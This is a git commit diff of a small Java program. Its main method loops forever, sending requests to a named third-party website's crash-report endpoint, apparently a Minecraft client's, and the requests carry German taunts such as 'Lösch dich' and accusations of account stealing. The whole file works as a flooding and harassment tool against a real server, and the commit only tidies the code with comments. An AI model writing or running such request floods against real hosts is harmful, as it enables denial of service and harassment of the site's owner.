190e856713b6cdf67fd8c73c7d256725e829b36d
Kroko1337 <z&tLDL9B6TXX9Dk^yLhVHyTeztb>
2021-03-20 22:11:00 +0100

    better code

--- src/Main.java
+++ src/Main.java
@@ -7,14 +7,18 @@ public class Main {
 
     public static void main(String[] args) throws IOException {
         while(true) {
-            String user = "Lösch dich";
-            String error = "imagine Account Stealen";
-            String description = "Wilder Skid Code bre";
-            URL url = new URL("http://supercraftalex.000webhostapp.com/liquido/crash.php?user=" + replace(user) + "&errs=" + replace(error) + "&exc=" + replace(description));
+            /*messages that shown*/
+            final String user = "Lösch dich";
+            final String error = "imagine Account Stealen";
+            final String description = "Wilder Skid Code bre";
+
+            /*connection to his server*/
+            final URL url = new URL("http://supercraftalex.000webhostapp.com/liquido/crash.php?user=" + replace(user) + "&errs=" + replace(error) + "&exc=" + replace(description));
             url.openConnection();
         }
     }
 
+    /* from the original Liquido Client*/
     public static String replace(String replacement) {
         return replacement.replaceAll("\n", "-----").replaceAll("\\{", "").replaceAll("\\}", "").replaceAll(" ", "%20").replaceAll("<", "-").replaceAll(">", "-").replaceAll("@", "%40");
     }
